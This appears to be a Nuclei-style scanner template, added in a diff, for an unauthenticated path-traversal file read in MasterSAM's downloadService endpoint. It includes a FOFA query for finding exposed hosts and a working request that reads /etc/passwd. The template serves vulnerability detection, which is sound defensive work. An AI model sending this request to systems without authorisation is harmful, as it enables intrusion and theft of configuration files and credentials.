@@ -1,0 +1,32 @@
+id: MasterSAM-downloadService-File-reading
+
+info:
+  name: "MasterSAM downloadService 任意文件读取漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="MasterSAM"
+
+    MasterSAM downloadService接口存在安全缺陷，允许未经身份验证的攻击者通过构造特定请求读取服务器上的任意文件，可能导致敏感信息泄露。该漏洞可被利用获取系统配置文件、数据库凭证及其他机密数据，存在严重安全风险。
+  reference:
+  - https://mp.weixin.qq.com/s/y6YagFvR1_ghGKO9KG__zA
+  tags: MasterSAM
+
+
+http:
+- raw:
+  - |
+    GET /adama/adama/downloadService?type=1&file=../../../../etc/passwd HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'root:'
+    - '/bin/bash'
+    condition: and
+  - type: status
+    status:
+    - 200
